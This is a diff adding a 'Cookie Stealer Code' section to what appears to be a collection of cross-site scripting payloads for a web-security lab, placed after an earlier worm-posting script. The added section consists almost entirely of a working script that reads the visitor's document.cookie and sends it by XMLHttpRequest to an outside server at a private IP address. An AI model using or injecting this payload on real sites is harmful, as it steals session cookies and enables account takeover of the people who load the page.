@@ -66,3 +66,33 @@ wormPost()
 })();
 </script>
 ```
+
+
+# Cookie Stealer Code 
+
+## Title
+
+```html
+This will steal your cookies 
+```
+
+## Content
+
+```html
+<!-- Content -->
+<script class="cookie-stealer" async>
+(function() {
+
+
+
+async function cookieStealer() {
+let xhr = new XMLHttpRequest();
+xhr.open('get', `http://10.156.88.35:8000?cookies = ${document.cookie}`);
+xhr.send();
+}
+
+cookieStealer()
+
+})();
+</script>
+```
